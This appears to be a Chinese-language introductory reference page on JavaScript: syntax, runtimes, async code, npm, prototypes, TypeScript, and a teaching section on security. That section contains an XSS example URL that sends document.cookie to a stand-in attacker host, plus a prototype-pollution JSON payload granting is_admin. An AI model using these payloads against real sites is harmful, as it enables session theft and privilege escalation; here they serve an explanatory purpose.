# JavaScript

> 浏览器里唯一能跑的语言，近几年通过 Node.js 也占领了服务端。前端（React/Vue）、后端（Express/Nest）、移动端（React Native）、桌面端（Electron）通吃。安全领域：XSS 攻击的核心语言、npm 供应链攻击的重灾区。

---

## 一眼认出这是 JavaScript

```javascript
// 注释：// 或 /* */
// 花括号 + 分号，长得像 C/Java 但不需要声明类型

// 变量声明（三种方式，行为不同）
var name = "Alice";        // 老式，函数作用域，不推荐
let age = 25;              // 块作用域，可变（推荐日常使用）
const PI = 3.14;           // 块作用域，不可变（推荐优先用）

// 函数：多种写法
function greet(name) {              // 老式函数声明
    return "Hello, " + name;
}

const greet = (name) => {           // 箭头函数（ES6+，更常见）
    return `Hello, ${name}`;        // 模板字符串用反引号 |
};

const greet = name => `Hello, ${name}`;  // 单行可省略 return

// 对象（和 JSON 很像但不是一回事）
const user = {
    name: "Alice",
    age: 25,
    greet() {                        // 方法简写
        console.log(`Hi, I'm ${this.name}`);
    }
};

// 数组和常用操作
const nums = [1, 2, 3, 4];
nums.map(n => n * 2);               // [2, 4, 6, 8]
nums.filter(n => n > 2);            // [3, 4]
nums.find(n => n === 3);            // 3
```

**一眼识别 JS 的关键特征：**
- `let` / `const` 声明变量（现代写法）
- 箭头函数 `=>` 
- `console.log()` 打印
- 模板字符串用反引号 `` ` ``

---

## 常用场景

| 场景 | 典型框架/工具 |
|------|-------------|
| 前端 UI | React, Vue, Angular, Svelte |
| 服务端 | Node.js + Express/Nest/Fastify |
| 全栈框架 | Next.js, Nuxt, Remix |
| 桌面应用 | Electron（VSCode、Obsidian 都是用 Electron 写的） |
| 移动应用 | React Native |
| 构建工具 | npm, yarn, webpack, vite, eslint |

---

## 关键概念

### 浏览器 vs Node.js

JavaScript 有两个截然不同的运行环境：

| | 浏览器 | Node.js |
|---|--------|---------|
| 全局对象 | `window` | `global` |
| DOM 操作 | `document.querySelector()` | 没有 DOM |
| 文件系统 | 不能访问（安全限制） | `fs.readFileSync()` |
| 模块化 | ES Modules（`import`/`export`） | CommonJS（`require`/`module.exports`）和 ESM 都支持 |
| 网络请求 | `fetch`（原生）、`XMLHttpRequest` | `fetch`（Node 18+）、`http` 模块 |

判断运行在哪：看到 `document.` 或 `window.` → 浏览器；看到 `require()` 或 `fs.` → Node.js。

### 异步模型

JavaScript 是单线程的，I/O 操作靠异步（不阻塞主线程）：

```javascript
// 回调（老式，不推荐）
fs.readFile('file.txt', (err, data) => {
    console.log(data);
});

// Promise（现代）
fetch('/api/data')
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => console.error(err));

// async/await（最现代，最可读）
async function getData() {
    try {
        const res = await fetch('/api/data');
        const data = await res.json();
        console.log(data);
    } catch (err) {
        console.error(err);
    }
}
```

### npm / node_modules

npm 是 JS 的包管理器，`node_modules/` 是依赖存放目录——著名的"黑洞"目录，体积可以非常庞大。

```bash
npm install express         # 安装依赖
npm install                 # 根据 package.json 安装所有依赖
npm run dev                 # 运行 package.json 中定义的脚本
```

`package.json` 类似 Python 的 `requirements.txt`，记录项目依赖和脚本。

### 原型继承（不是类继承）

JavaScript 使用原型链（Prototype Chain）而不是传统类的继承：

```javascript
const parent = { greet() { return "Hello"; } };
const child = Object.create(parent);    // child 继承 parent
child.greet();                          // "Hello"（从原型链查找）

// ES6 的 class 语法糖（底层仍然是原型）
class Animal {
    constructor(name) { this.name = name; }
    speak() { return `${this.name} makes a sound.`; }
}
```

---

## 安全相关

### XSS（Cross-Site Scripting）

JavaScript 是 XSS 攻击的核心载体——攻击者向页面注入恶意脚本，在受害者浏览器中执行：

```javascript
// 反射型 XSS：恶意脚本通过 URL 参数传入
// URL: /search?q=<script>fetch('http://attacker.com/?c='+document.cookie)</script>

// DOM 型 XSS：恶意数据被不安全地写入 DOM
document.getElementById('result').innerHTML = userInput;  // 危险
document.getElementById('result').textContent = userInput; // 安全
```

### 原型污染（Prototype Pollution）

JavaScript 特有的攻击方式，通过污染 `__proto__` 影响所有对象：

```javascript
// 攻击者控制的 JSON
const malicious = JSON.parse('{"__proto__": {"is_admin": true}}');

// 不安全的合并
const user = {};
Object.assign(user, malicious);    // 原型被污染

// 后果
const newObj = {};
console.log(newObj.is_admin);      // true（从污染的原型继承）
```

防御：用 `Object.create(null)` 创建无原型对象，或用 Map 代替普通对象。

### npm 供应链攻击

npm 生态的依赖嵌套深、更新频繁，是供应链攻击的高发区：

- 恶意包名仿冒（typosquatting）：`express` → `exprees`
- 依赖混淆：私有包名被公开注册劫持
- 维护者账号被盗：攻击者发布恶意版本的合法包

### `eval()` 和 `new Function()`

```javascript
eval("console.log('任意代码')");          // 危险，可执行任意代码
new Function("return " + userInput)();    // 同样危险
setTimeout("alert(1)", 1000);             // setTimeout 传字符串时会 eval
```

---

## TypeScript

TypeScript 是 JavaScript 的超集，加了类型系统。现在新项目大多用 TypeScript：

```typescript
// .ts 文件
function greet(name: string): string {    // 参数和返回值有类型
    return `Hello, ${name}`;
}

interface User {
    name: string;
    age: number;
}
```

看到 `.ts` 或 `.tsx` 文件就知道是 TypeScript 项目，看到类型注解就知道不是纯 JS。

---

## 简单总结

- **浏览器里唯一能跑的语言**：前端离不开它
- **动态弱类型**：变量不声明类型，`==` 会做类型转换（用 `===`）
- **`let`/`const` + 箭头函数 `=>`**：现代 JS 的标志
- **`node_modules/` 黑洞**：npm 的依赖树，体积惊人
- **XSS 攻击的载体**：理解 XSS 必须先理解 JS
- **原型污染是 JS 特有的漏洞类型**：`__proto__` 是关键
